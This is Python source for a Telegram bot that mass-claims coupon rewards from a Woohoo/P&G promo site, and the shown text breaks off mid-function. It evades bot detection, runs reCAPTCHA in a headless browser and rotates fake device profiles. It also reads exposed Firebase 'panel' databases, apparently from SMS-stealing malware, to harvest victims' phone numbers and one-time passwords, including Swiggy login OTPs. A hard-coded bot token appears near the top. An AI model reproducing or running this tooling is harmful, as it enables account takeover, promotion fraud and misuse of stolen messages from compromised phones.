import asyncio
import base64
import json
import logging
import os
import random
import re
import tempfile
import time
import zipfile
from collections import defaultdict
from datetime import datetime
from typing import Awaitable, Callable, Optional
from urllib.parse import urlparse, parse_qs, unquote

import requests
from playwright.async_api import async_playwright, Playwright, Browser, BrowserContext, Page
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BotCommand,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ==========================================
# 1. CONFIGURATION & LOGGING
# ==========================================
BOT_TOKEN = "8880114377:AAF2y9BlrEn6JBGotC38ILW9MrwKYAXS88M"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

CLAIMS_DATA_FILE = "claimed_coupons.json"  # Stores claimed coupon logs from both Direct Mobile and Firebase flows
MAX_DIRECT_LINKS = 20  # Requires a .txt or .zip file if more than 20 links are submitted
MAX_CONCURRENT_REQUESTS = 10  # Concurrency limit for checking Firebase URLs
MAX_FIREBASE_UPI_USES = 8  # Fixed usage limit per fresh UPI ID
MAX_FIREBASE_NUMBER_USES = 8  # Fixed usage limit per verified working Firebase number (1st claim + up to 7 more)
MAX_SEND_RETRIES = 2  # Maximum OTP send attempts per online mobile number
WAIT_SECONDS = 10  # Wait duration in seconds per OTP check cycle
SMS_WAIT_TIMEOUT = float(WAIT_SECONDS)

OTP_KEYWORDS = ["VM-QWKCLR-S", "otp", "code", "verification", "login"]
OTP_PATTERNS = [
    re.compile(r"Use OTP (\d{6}) to log into your Swiggy account", re.IGNORECASE),
    re.compile(r"(\d{6})\s+is your Swiggy", re.IGNORECASE),
    re.compile(r"VM-QWKCLR-S.*?OTP.*?(\d{6})", re.IGNORECASE),
    re.compile(r"login code[:\s]*(\d{6})", re.IGNORECASE),
    re.compile(r"verification code[:\s]*(\d{6})", re.IGNORECASE),
    re.compile(r"(?<!\d)(\d{6})(?!\d)"),
]

file_lock = asyncio.Lock()
active_claim_tasks: dict[int, asyncio.Task] = {}

# Conversation States
WAITING_FOR_FIREBASE_INPUT = 1
WAITING_FOR_DIRECT_MOBILE_FLOW = 2
WAITING_FOR_FIREBASE_COUPONS = 3
WAITING_FOR_FIREBASE_UPI = 4
WAITING_FOR_CHECK_COUPONS = 5

# ==========================================
# WOOHOO DIRECT MOBILE CLAIM CONFIGURATION
# ==========================================
BASE_URL = "https://pgretailpromo.woohoo.in"
API_ENDPOINT = "https://pgretailpromo.woohoo.in/ClaimReward/SaveData"
RECAPTCHA_SITE_KEY = "6Lfxu4UpAAAAAHGbsaANLP86Im_jvVTGp1bjZbN0"

STATES_LIST = ["JHARKHAND", "BIHAR", "DELHI", "MAHARASHTRA", "KARNATAKA", "KERALA"]

PROXIES_CONFIG = []

CHANNELS = {
    "-1003332858806": {
        "name": "📢 GBX LOOT",
        "url": "https://t.me/+6ByfGDRBKgsxMjZl",
    },
    "-1003630519339": {
        "name": "📢 GBX EARN",
        "url": "https://t.me/+OWrCoeF-JutmNjg1",
    },
    "-1003197501531": {
        "name": "📢 GBX ZONE",
        "url": "https://t.me/+f2mWfDs6EUIxYTBl",
    },
    "-1003862251237": {
        "name": "💬 Join Group Chat (GC)",
        "url": "https://t.me/+O_-kEF2f5f1kMjdl",
    },
}

DEVICE_PROFILES = [
    {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "is_mobile": False,
    },
    {
        "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        "is_mobile": True,
    },
    {
        "user-agent": "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
        "is_mobile": True,
    },
    {
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "is_mobile": False,
    },
]

SESSION_TIMEOUT_SECONDS = 600  # 10 minutes inactivity timeout


# ==========================================
# 2. GLOBAL BROWSER & UNIFIED SESSION CLIENT
# ==========================================
global_playwright: Optional[Playwright] = None
global_browser: Optional[Browser] = None
browser_init_lock = asyncio.Lock()
cleanup_task: Optional[asyncio.Task] = None

user_sessions = {}
user_locks: dict[int, asyncio.Lock] = {}


def get_user_lock(chat_id: int) -> asyncio.Lock:
    if chat_id not in user_locks:
        user_locks[chat_id] = asyncio.Lock()
    return user_locks[chat_id]


async def cancel_running_claim_task(chat_id: int) -> None:
    """Immediately cancels any running background auto-claim task for the given chat_id."""
    task = active_claim_tasks.pop(chat_id, None)
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass


async def _send_safe_long_text(
    message_target,
    text: str,
    reply_markup=None,
    parse_mode: Optional[str] = ParseMode.MARKDOWN,
    disable_web_page_preview: bool = True,
) -> None:
    """Safely sends messages under Telegram's 4096-char limit so Message is too long never occurs."""
    safe_text = str(text or "")
    if len(safe_text) <= 3900:
        try:
            await message_target.reply_text(
                safe_text,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                disable_web_page_preview=disable_web_page_preview,
            )
            return
        except Exception:
            if parse_mode is not None:
                await message_target.reply_text(
                    _sanitize_plain_log_text(safe_text)[:3900],
                    reply_markup=reply_markup,
                    parse_mode=None,
                    disable_web_page_preview=disable_web_page_preview,
                )
                return
            raise

    chunks = [safe_text[i:i + 3850] for i in range(0, len(safe_text), 3850)]
    for idx, ch in enumerate(chunks):
        is_last = idx == len(chunks) - 1
        try:
            await message_target.reply_text(
                ch,
                reply_markup=reply_markup if is_last else None,
                parse_mode=parse_mode,
                disable_web_page_preview=disable_web_page_preview,
            )
        except Exception:
            await message_target.reply_text(
                _sanitize_plain_log_text(ch)[:3850],
                reply_markup=reply_markup if is_last else None,
                parse_mode=None,
                disable_web_page_preview=disable_web_page_preview,
            )


async def get_unjoined_channels(bot, user_id: int) -> list[dict]:
    """Checks which required Telegram channels/groups the user has not joined yet."""
    unjoined = []
    for channel_id, info in CHANNELS.items():
        try:
            member = await bot.get_chat_member(chat_id=int(channel_id), user_id=user_id)
            if member.status in ("left", "kicked", "restricted"):
                unjoined.append(info)
        except Exception:
            unjoined.append(info)
    return unjoined


def build_join_keyboard(unjoined_channels: list[dict]) -> InlineKeyboardMarkup:
    """Builds inline buttons for remaining unjoined channels and a verification button."""
    keyboard = []
    for ch in unjoined_channels:
        keyboard.append([InlineKeyboardButton(text=ch["name"], url=ch["url"])])
    keyboard.append([InlineKeyboardButton(text="✅ Verify Membership", callback_data="verify_join")])
    return InlineKeyboardMarkup(keyboard)


async def ensure_user_subscribed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Sends an Access Denied prompt with join buttons if the user hasn't joined all required channels."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    unjoined = await get_unjoined_channels(context.bot, user_id)
    if not unjoined:
        return True

    await cancel_running_claim_task(chat_id)
    await close_user_session(chat_id)
    reply_markup = build_join_keyboard(unjoined)
    msg_text = (
        "🚫 **Access Denied**\n\n"
        "To use this bot, you must join all required channels and the community group listed below.\n"
        "Once joined, click **'✅ Verify Membership'** to proceed:"
    )
    if update.callback_query:
        try:
            await update.callback_query.edit_message_text(msg_text, reply_markup=reply_markup, parse_mode="Markdown")
        except Exception:
            pass
    elif update.message:
        await update.message.reply_text(msg_text, reply_markup=reply_markup, parse_mode="Markdown")
    return False


async def get_shared_browser(headless: bool = True, force_restart: bool = False) -> Browser:
    """Initializes and reuses a single global Chromium browser instance."""
    global global_playwright, global_browser
    async with browser_init_lock:
        if force_restart and global_browser:
            try:
                await global_browser.close()
            except Exception:
                pass
            global_browser = None

        if global_browser and global_browser.is_connected():
            return global_browser

        global_browser = None
        if not global_playwright:
            global_playwright = await async_playwright().start()

        global_browser = await global_playwright.chromium.launch(
            headless=False,
            args=[
                "--headless=new",
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--no-zygote",
                "--single-process",
                "--disable-features=IsolateOrigins,site-per-process",
                "--ignore-certificate-errors",
            ],
        )
        return global_browser


class UnifiedSessionClient:
    """
    Handles multi-step form/API workflows and dynamic tokens using an isolated
    BrowserContext per user inside the shared global Chromium instance.
    """

    def __init__(self, base_url: str, device_profile: dict, proxy_cfg: Optional[dict] = None, headless: bool = True):
        self.base_url = base_url.rstrip("/")
        self.device_profile = device_profile
        self.user_agent = device_profile["user-agent"]
        self.proxy_cfg = proxy_cfg
        self.headless = headless

        self.context: Optional[BrowserContext] = None
        self.page: Optional[Page] = None

    async def start(self):
        """Initializes a new isolated Context and Page inside the shared Browser."""
        is_mobile = self.device_profile.get("is_mobile", False)
        viewport = {"width": 390, "height": 844} if is_mobile else {"width": 1280, "height": 800}

        context_kwargs = {
            "user_agent": self.user_agent,
            "viewport": viewport,
            "is_mobile": is_mobile,
            "has_touch": is_mobile,
            "locale": "en-IN",
            "timezone_id": "Asia/Kolkata",
            "ignore_https_errors": True,
        }

        if self.proxy_cfg and self.proxy_cfg.get("server"):
            proxy_dict = {"server": self.proxy_cfg["server"]}
            if self.proxy_cfg.get("username"):
                proxy_dict["username"] = self.proxy_cfg["username"]
                proxy_dict["password"] = self.proxy_cfg.get("password", "")
            context_kwargs["proxy"] = proxy_dict

        for attempt in range(2):
            browser = await get_shared_browser(headless=self.headless, force_restart=(attempt > 0))
            try:
                self.context = await browser.new_context(**context_kwargs)
                await self.context.add_init_script(
                    "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
                )
                self.page = await self.context.new_page()
                return
            except Exception as e:
                await self.close()
                if attempt == 1:
                    raise e

    async def load_initial_page(self) -> dict:
        """Loads the main page, sets cookies, and extracts the CSRF token and available state options."""
        if not self.page:
            raise RuntimeError("Session has not been started. Call start() first.")

        await self.page.goto(self.base_url, wait_until="domcontentloaded", timeout=20000)

        try:
            await self.page.wait_for_selector(
                'input[name="__RequestVerificationToken"]',
                state="attached",
                timeout=8000,
            )
        except Exception:
            return {"csrf_token": "", "states": []}

        page_data = await self.page.evaluate("""
            () => {
                const tokenEl = document.querySelector('input[name="__RequestVerificationToken"]');
                const csrf_token = tokenEl ? tokenEl.value : "";

                const states = [];
                const stateSelect = document.querySelector('select[name="STATE"], select#STATE, select[name*="state" i]');
                if (stateSelect) {
                    for (const opt of stateSelect.options) {
                        const val = opt.value ? opt.value.trim() : "";
                        const txt = opt.text ? opt.text.trim().toUpperCase() : "";
                        if (val && val !== "0" && txt && !txt.includes("SELECT")) {
                            states.push({ id: val, name: txt });
                        }
                    }
                }
                return { csrf_token, states };
            }
        """)
        return page_data

    async def get_dynamic_token(
        self,
        fallback_site_key: str = RECAPTCHA_SITE_KEY,
        action: str = "submit",
    ) -> str:
        """
        Auto-detects site_key from DOM ([data-sitekey]), iframe (?k=), or script tags
        and executes reCAPTCHA to obtain a fresh token.
        """
        if not self.page:
            return ""

        token = await self.page.evaluate(
            """async ({ fallbackKey, actionName }) => {
                let detectedKey = "";

                // 1. Auto-detect data-sitekey from DOM
                const keyEl = document.querySelector('[data-sitekey]');
                if (keyEl && keyEl.getAttribute('data-sitekey')) {
                    detectedKey = keyEl.getAttribute('data-sitekey');
                }

                // 2. Extract 'k' parameter from iframe URL
                if (!detectedKey) {
                    const iframe = document.querySelector('iframe[src*="recaptcha"]');
                    if (iframe && iframe.src) {
                        try {
                            const iframeUrl = new URL(iframe.src);
                            const kParam = iframeUrl.searchParams.get('k');
                            if (kParam) detectedKey = kParam;
                        } catch (e) {}
                    }
                }

                // 3. Extract render key from script tag
                if (!detectedKey) {
                    const scriptEl = document.querySelector('script[src*="recaptcha/api.js"]');
                    if (scriptEl && scriptEl.src) {
                        try {
                            const urlObj = new URL(scriptEl.src);
                            const renderParam = urlObj.searchParams.get('render');
                            if (renderParam && renderParam !== 'explicit') {
                                detectedKey = renderParam;
                            }
                        } catch (e) {}
                    }
                }

                const finalSiteKey = detectedKey || fallbackKey;

                // 4. Execute v3 grecaptcha if available
                if (window.grecaptcha && typeof window.grecaptcha.execute === 'function' && finalSiteKey) {
                    try {
                        return await new Promise((resolve) => {
                            window.grecaptcha.ready(async () => {
                                try {
                                    const t = await window.grecaptcha.execute(finalSiteKey, { action: actionName });
                                    resolve(t || "");
                                } catch (err) {
                                    resolve("");
                                }
                            });
                        });
                    } catch (e) {
                        console.error("grecaptcha execute error:", e);
                    }
                }

                // 5. Fallback: inspect DOM textarea/input
                const el = document.querySelector('textarea[name="g-recaptcha-response"], input[name="g-recaptcha-response"]');
                return el && el.value ? el.value : "";
            }""",
            {"fallbackKey": fallback_site_key, "actionName": action},
        )
        return token

    async def post_step(self, endpoint: str, form_data: dict) -> dict:
        """
        Submits a POST request using the browser page's native fetch() API so that
        cookies, User-Agent, and sec-ch-ua headers remain automatically synchronized.
        """
        if not self.page:
            raise RuntimeError("Browser page is not available.")

        url = endpoint if endpoint.startswith("http") else f"{self.base_url}/{endpoint.lstrip('/')}"

        result = await self.page.evaluate(
            """async ({ targetUrl, payload }) => {
                const bodyParams = new URLSearchParams();
                for (const [key, val] of Object.entries(payload)) {
                    bodyParams.append(key, val !== null && val !== undefined ? String(val) : "");
                }

                const resp = await fetch(targetUrl, {
                    method: "POST",
                    headers: {
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest"
                    },
                    body: bodyParams.toString(),
                    credentials: "same-origin"
                });

                const rawText = await resp.text();

                return {
                    status: resp.status,
                    ok: resp.ok,
                    rawText: rawText
                };
            }""",
            {"targetUrl": url, "payload": form_data},
        )

        raw_text = result["rawText"]
        try:
            parsed = json.loads(raw_text)
        except json.JSONDecodeError:
            parsed = {"raw": raw_text}

        return {
            "status": result["status"],
            "ok": result["ok"],
            "data": parsed,
        }

    async def close(self):
        """Cleanly closes only this session's Page and Context while keeping the Global Browser active."""
        for resource_close in (
            self.page.close if self.page else None,
            self.context.close if self.context else None,
        ):
            if resource_close:
                try:
                    await resource_close()
                except Exception as e:
                    print(f"[Context Close Warning]: {e}")
        self.page = None
        self.context = None


async def safe_post_json(client: UnifiedSessionClient, url: str, payload: dict) -> dict:
    """
    Sends a POST request and validates HTTP 200 OK status as well as JSON vs HTML/WAF responses.
    """
    res = await client.post_step(url, payload)

    if res["status"] != 200:
        raise RuntimeError(f"HTTP {res['status']}: The server rejected the request.")

    data = res["data"]
    if isinstance(data, dict) and "raw" in data and len(data) == 1:
        raw_content = data["raw"].strip()
        if raw_content.startswith("<") or "<html" in raw_content.lower():
            raise RuntimeError("The server or security firewall (WAF) blocked the session, or the session expired.")
        raise RuntimeError("Received an invalid (non-JSON) response from the server.")

    return data


async def close_user_session(chat_id: int):
    """Safely closes and removes an active user session."""
    session = user_sessions.pop(chat_id, None)
    if session and "client" in session:
        await session["client"].close()


async def cleanup_loop():
    """Closes inactive sessions every 60 seconds to prevent memory leaks."""
    while True:
        try:
            await asyncio.sleep(60)
            now = time.time()
            expired_chats = [
                cid
                for cid, sess in list(user_sessions.items())
                if now - sess.get("last_activity", now) > SESSION_TIMEOUT_SECONDS
            ]
            for cid in expired_chats:
                lock = get_user_lock(cid)
                if not lock.locked():
                    async with lock:
                        sess = user_sessions.get(cid)
                        if sess and (time.time() - sess.get("last_activity", now) > SESSION_TIMEOUT_SECONDS):
                            print(f"[Auto-Cleanup] Closing inactive session for chat_id: {cid}")
                            await close_user_session(cid)
                    user_locks.pop(cid, None)
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[Cleanup Loop Warning]: {e}")


async def on_startup(application: Application):
    """Configures bot menu commands, initializes the shared browser, and starts the cleanup loop."""
    global cleanup_task
    await application.bot.delete_my_commands()
    await application.bot.set_my_commands(
        [
            BotCommand("start", "Restart"),
            BotCommand("pnlclaim", "Claim from pnl"),
            BotCommand("claim", "Claim from no."),
        ]
    )
    await get_shared_browser(headless=True)
    cleanup_task = asyncio.create_task(cleanup_loop())


async def on_shutdown(application: Application):
    """Cleanly shuts down all active sessions and the shared browser instance."""
    global global_playwright, global_browser, cleanup_task

    if cleanup_task and not cleanup_task.done():
        cleanup_task.cancel()
        try:
            await cleanup_task
        except asyncio.CancelledError:
            pass

    for cid in list(active_claim_tasks.keys()):
        await cancel_running_claim_task(cid)

    for cid in list(user_sessions.keys()):
        await close_user_session(cid)
    user_locks.clear()

    if global_browser:
        try:
            await global_browser.close()
        except Exception as e:
            print(f"[Global Browser Close Warning]: {e}")
        global_browser = None

    if global_playwright:
        try:
            await global_playwright.stop()
        except Exception as e:
            print(f"[Playwright Stop Warning]: {e}")
        global_playwright = None


async def init_user_session(chat_id: int) -> bool:
    """Closes any previous session and initializes a new UnifiedSessionClient with proxy fallback."""
    await close_user_session(chat_id)

    selected_device = random.choice(DEVICE_PROFILES)
    proxies_to_try = random.sample(PROXIES_CONFIG, len(PROXIES_CONFIG)) if PROXIES_CONFIG else [None]

    for proxy_cfg in proxies_to_try:
        client = UnifiedSessionClient(
            base_url=BASE_URL,
            device_profile=selected_device,
            proxy_cfg=proxy_cfg,
            headless=True,
        )
        try:
            async def _connect_and_load():
                await client.start()
                return await client.load_initial_page()

            page_info = await asyncio.wait_for(_connect_and_load(), timeout=25.0)
            verification_token = page_info.get("csrf_token", "")
            scraped_states = page_info.get("states", [])

            if verification_token:
                matching_states = [
                    s for s in scraped_states if s["name"] in STATES_LIST
                ]
                if matching_states:
                    chosen_state = random.choice(matching_states)
                    state_name = chosen_state["name"]
                    state_dropdown_id = chosen_state["id"]
                elif scraped_states:
                    chosen_state = random.choice(scraped_states)
                    state_name = chosen_state["name"]
                    state_dropdown_id = chosen_state["id"]
                else:
                    state_name = random.choice(STATES_LIST)
                    state_dropdown_id = "1"

                user_sessions[chat_id] = {
                    "step": "AWAITING_MOBILE",
                    "client": client,
                    "proxy": proxy_cfg,
                    "user_agent": selected_device["user-agent"],
                    "mobile": None,
                    "code": None,
                    "state": state_name,
                    "state_dropdown": state_dropdown_id,
                    "otp": None,
                    "upi_id": None,
                    "dynamic_token": verification_token,
                    "last_activity": time.time(),
                }
                return True
        except asyncio.TimeoutError:
            print(f"[Session Init Timeout] Proxy {proxy_cfg.get('server') if proxy_cfg else 'None'} took more than 25s.")
        except Exception as e:
            print(f"[Session Init Error with proxy {proxy_cfg.get('server') if proxy_cfg else 'None'}]: {e}")

        await client.close()

    return False


# ==========================================
# 3. FIREBASE STATUS CHECKER (SINGLE CHECK)
# ==========================================
def _build_firebase_query_url(firebase_url: str, node_suffix: str = "") -> str:
    """
    Safely constructs a valid Firebase REST API URL (.json) while preserving
    any query parameters such as ?auth=... and fixing malformed /json paths.
    """
    parsed = urlparse(firebase_url.strip())
    path = parsed.path or ""

    if path.endswith("/json") and not path.endswith("/.json"):
        path = path[:-5] + "/.json"

    if not path.endswith(".json"):
        clean_path = path.rstrip("/")
        if node_suffix:
            clean_suffix = node_suffix.lstrip("/")
            path = f"{clean_path}/{clean_suffix}" if clean_path else f"/{clean_suffix}"
        else:
            path = f"{clean_path}/.json" if clean_path else "/.json"

    rebuilt = parsed._replace(path=path)
    return rebuilt.geturl()


def _parse_any_timestamp_to_seconds(ts_val) -> Optional[float]:
    """Converts numeric epoch (sec/ms/us) or ISO/date string timestamps into Unix seconds."""
    if ts_val is None or isinstance(ts_val, bool):
        return None

    if isinstance(ts_val, (int, float)):
        val = float(ts_val)
        if val <= 0:
            return None
        if val > 1e14:      # microseconds
            return val / 1e6
        if val > 1e11:      # milliseconds
            return val / 1000.0
        if val > 1e9:       # seconds (valid modern epoch)
            return val
        return None

    if isinstance(ts_val, str):
        s = ts_val.strip()
        if not s:
            return None
        if s.isdigit():
            return _parse_any_timestamp_to_seconds(float(s))
        for fmt in (
            "%Y-%m-%dT%H:%M:%S.%fZ",
            "%Y-%m-%dT%H:%M:%SZ",
            "%Y-%m-%dT%H:%M:%S",
            "%Y-%m-%d %H:%M:%S",
            "%d-%m-%Y %H:%M:%S",
            "%d/%m/%Y %H:%M:%S",
            "%Y/%m/%d %H:%M:%S",
        ):
            try:
                return datetime.strptime(s, fmt).timestamp()
            except ValueError:
                continue
        try:
            return datetime.fromisoformat(s.replace("Z", "+00:00")).timestamp()
        except Exception:
            return None

    return None


def _collect_timestamps_and_activity_recursive(obj, timestamps: list[float], state_flags: dict) -> None:
    """
    Recursively traverses the entire Firebase JSON tree (including nested sms/messages/devices nodes)
    to gather all valid timestamps and online/active indicators.
    """
    ts_keys = {
        "timestamp", "date", "time", "createdat", "created_at",
        "updatedat", "updated_at", "lastseen", "last_seen",
        "ping", "heartbeat", "smstime", "sms_time", "receivedat", "received_at",
    }

    if isinstance(obj, dict):
        if _is_firebase_node_online(obj):
            state_flags["has_online_node"] = True

        for k, v in obj.items():
            k_lower = str(k).lower()

            key_ts = _parse_any_timestamp_to_seconds(k)
            if key_ts is not None:
                timestamps.append(key_ts)

            if k_lower in ts_keys or "time" in k_lower or "date" in k_lower:
                parsed_ts = _parse_any_timestamp_to_seconds(v)
                if parsed_ts is not None:
                    timestamps.append(parsed_ts)
            elif isinstance(v, (int, float)) and v > 1e11:
                parsed_ts = _parse_any_timestamp_to_seconds(v)
                if parsed_ts is not None:
                    timestamps.append(parsed_ts)

            if isinstance(v, (dict, list)):
                _collect_timestamps_and_activity_recursive(v, timestamps, state_flags)

    elif isinstance(obj, list):
        for item in obj:
            _collect_timestamps_and_activity_recursive(item, timestamps, state_flags)


def check_firebase_sms_status(firebase_url: str) -> str:
    """
    Checks a single Firebase endpoint once (no repeated multi-path hits) to determine
    whether it is Active or Inactive.
    """
    target_url = _build_firebase_query_url(firebase_url, "")
    all_timestamps: list[float] = []
    state_flags = {"has_online_node": False}

    try:
        response = requests.get(target_url, timeout=15)
        response.raise_for_status()
        data = response.json()

        if data is None or data == {} or data == []:
            return "Inactive (Database is empty)"

        _collect_timestamps_and_activity_recursive(data, all_timestamps, state_flags)

        if all_timestamps:
            latest_ts_sec = max(all_timestamps)
            time_diff = time.time() - latest_ts_sec
            if time_diff <= 600:
                secs = max(0, int(time_diff))
                return f"Active (Last SMS/activity {secs}s ago)"
            else:
                mins = int(time_diff // 60)
                return f"Inactive (Last SMS/activity {mins} min ago)"

        if state_flags["has_online_node"]:
            return "Active (Live JSON data accessible)"

        return "Active (Live JSON data accessible)"

    except requests.exceptions.HTTPError as e:
        if e.response is not None and e.response.status_code == 401:
            return "Error: Permission Denied (Firebase rules are private)"
        elif e.response is not None:
            return f"HTTP Error: {e.response.status_code} ({e.response.reason})"
        return f"HTTP Error: {e}"
    except Exception as e:
        return f"Error: {e}"


# ==========================================
# 4. EXTRACTION, FILE & CLAIM LEADERBOARD HELPERS
# ==========================================
def extract_urls_from_text(text: str) -> list[str]:
    """Extracts clean, unique URLs from text."""
    url_pattern = r'https?://[^\s<>"]+|www\.[^\s<>"]+'
    raw_urls = re.findall(url_pattern, text, re.IGNORECASE)
    cleaned_urls = [url.rstrip('.,;:!?)\']}') for url in raw_urls]
    return list(dict.fromkeys(cleaned_urls))


def _normalize_extracted_firebase_url(raw_fb_url: str) -> str:
    """
    Cleans extracted Firebase URLs while preserving '.json' and query parameters
    (like '?auth=...') and fixing malformed '/json' suffixes.
    """
    parsed = urlparse(raw_fb_url.strip())
    path = parsed.path or ""

    if path.endswith("/json") and not path.endswith("/.json"):
        path = path[:-5] + "/.json"
    elif path != "/.json" and not path.endswith(".json"):
        path = path.rstrip("/")

    return parsed._replace(path=path).geturl()


def extract_firebase_from_url(target_url: str) -> str | None:
    """Extracts a Firebase Realtime Database URL directly or from Base64-encoded panel parameters."""
    if not target_url.lower().startswith(("http://", "https://")):
        target_url = "https://" + target_url

    parsed = urlparse(target_url)
    params = parse_qs(parsed.query)
    firebase_pattern = r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s#]*)?'

    direct_match = re.search(firebase_pattern, target_url, re.IGNORECASE)
    if direct_match:
        return _normalize_extracted_firebase_url(direct_match.group(0))

    for _, values in params.items():
        for val in values:
            try:
                clean_val = unquote(val).strip()
                padded_val = clean_val + '=' * (-len(clean_val) % 4)
                decoded_bytes = base64.urlsafe_b64decode(padded_val)
                decoded_text = decoded_bytes.decode('utf-8', errors='ignore')

                match = re.search(firebase_pattern, decoded_text, re.IGNORECASE)
                if match:
                    return _normalize_extracted_firebase_url(match.group(0))
            except Exception:
                continue

    return None


def filter_valid_firebase_urls(urls: list[str]) -> tuple[list[tuple[str, str]], int]:
    """
    Filters and retains only valid Firebase/Panel URLs.
    Returns: ([(original_url, extracted_firebase_url), ...], rejected_count)
    """
    valid_pairs = []
    rejected_count = 0

    for url in urls:
        fb_url = extract_firebase_from_url(url)
        if fb_url:
            valid_pairs.append((url, fb_url))
        else:
            rejected_count += 1

    return valid_pairs, rejected_count


def _glimpse_header_pattern_once(text: str) -> Optional[str]:
    """
    Takes a single non-hardcoded probability glimpse at SMS/header tokens like
    VM-QWKCLR-S or QWKCLR-style 6-letter sender/header codes when present.
    """
    if not text:
        return None
    glimpse = re.search(r'\b(?:[A-Z]{2}-)?([A-Z]{6})(?:-[A-Z0-9]+)?\b', text)
    if glimpse:
        return glimpse.group(1)
    return None


def extract_numbers_and_otps(text: str) -> dict:
    """
    Extracts 10-digit Indian mobile numbers and 6-digit OTPs from text or SMS payloads,
    with a single non-hardcoded probability glimpse at 6-letter header/sender tokens (like QWKCLR).
    """
    number_pattern = r'(?<!\d)(?:\+91[\-\s]?|91[\-\s]?|0)?([6-9]\d{9})(?!\d)'
    numbers = list(dict.fromkeys(re.findall(number_pattern, text)))

    _ = _glimpse_header_pattern_once(text)

    six_digit_otps = []
    ctx_matches = re.findall(
        r'(?:OTP|code|pin|passcode|password|verification|ओटीपी|कोड)[^\d\n]{0,25}(?<!\d)(\d{6})(?!\d)',
        text,
        re.IGNORECASE,
    )
    for code in ctx_matches:
        if code not in six_digit_otps:
            six_digit_otps.append(code)

    for m in re.finditer(r'(?<!\d)(\d{6})(?!\d)', text):
        candidate = m.group(1)
        start, end = m.span(1)
        left_ctx = text[max(0, start - 4):start]
        right_ctx = text[end:min(len(text), end + 4)]
        if re.search(r'\d', left_ctx) or re.search(r'\d', right_ctx):
            continue
        if candidate not in six_digit_otps:
            six_digit_otps.append(candidate)

    return {
        "numbers": numbers,
        "otps": six_digit_otps,
    }


def extract_coupon_codes_from_text(text: str) -> list[str]:
    """Extracts unique alphanumeric coupon codes from text or a .txt file."""
    raw_tokens = re.split(r'[\s,;|]+', text.strip())
    coupons = []
    for token in raw_tokens:
        clean_code = re.sub(r'^[^A-Za-z0-9]+|[^A-Za-z0-9]+$', '', token).upper()
        if len(clean_code) >= 4 and clean_code.isalnum():
            if clean_code not in coupons:
                coupons.append(clean_code)
    return coupons


def is_valid_upi_format(upi_id: str) -> bool:
    """Validates strict UPI ID format (username@bankhandle)."""
    upi_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9.\-_]{1,254}@[a-zA-Z0-9]{2,64}$'
    return bool(re.match(upi_pattern, upi_id))


def _is_firebase_node_offline(node: dict) -> bool:
    """Checks whether a Firebase device/session node is marked offline."""
    status_val = str(
        node.get("status")
        or node.get("state")
        or node.get("connection")
        or node.get("network")
        or node.get("mode")
        or ""
    ).strip().lower()

    if "offline" in status_val:
        return True

    for flag_key in ("online", "isOnline", "is_online", "active", "isActive"):
        if flag_key in node:
            val = node[flag_key]
            if val is False or str(val).strip().lower() in ("false", "0", "no", "offline"):
                return True

    if "offline" in node and node["offline"] is True:
        return True

    return False


def _is_firebase_node_online(node: dict) -> bool:
    """Checks whether a Firebase device/session node is explicitly online or recently active."""
    if _is_firebase_node_offline(node):
        return False

    status_val = str(
        node.get("status")
        or node.get("state")
        or node.get("connection")
        or node.get("network")
        or node.get("mode")
        or ""
    ).strip().lower()

    if "online" in status_val:
        return True

    for flag_key in ("online", "isOnline", "is_online", "active", "isActive"):
        if flag_key in node:
            val = node[flag_key]
            if val is True or str(val).strip().lower() in ("true", "1", "yes", "online"):
                return True

    for ts_key in ("lastSeen", "last_seen", "ping", "heartbeat", "updatedAt", "timestamp"):
        ts = node.get(ts_key)
        if ts is not None:
            parsed_sec = _parse_any_timestamp_to_seconds(ts)
            if parsed_sec is not None and 0 <= (time.time() - parsed_sec) <= 600:
                return True

    return False


def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inherited_online: bool = False) -> list[str]:
    """
    Scans a Firebase JSON tree:
    - Skips any 'offline' session/branch completely.
    - Extracts 10-digit Indian mobile numbers exclusively from 'online' sessions/devices.
    """
    number_pattern = r'(?<!\d)(?:\+91[\-\s]?|91[\-\s]?|0)?([6-9]\d{9})(?!\d)'
    results = []

    if isinstance(obj, dict):
        if _is_firebase_node_offline(obj):
            return []

        node_online = inherited_online or _is_firebase_node_online(obj)

        for key, val in obj.items():
            key_lower = str(key).lower()
            if "offline" in key_lower:
                continue
            if key_lower in ("sms", "messages", "inbox", "user_sms", "all_user", "all_users"):
                continue

            branch_online = node_online or ("online" in key_lower)

            if branch_online:
                key_nums = re.findall(number_pattern, str(key))
                for n in key_nums:
                    if n not in results:
                        results.append(n)

            if isinstance(val, (dict, list)):
                sub_nums = _extract_online_numbers_from_tree(
                    val,
                    inherited_offline=False,
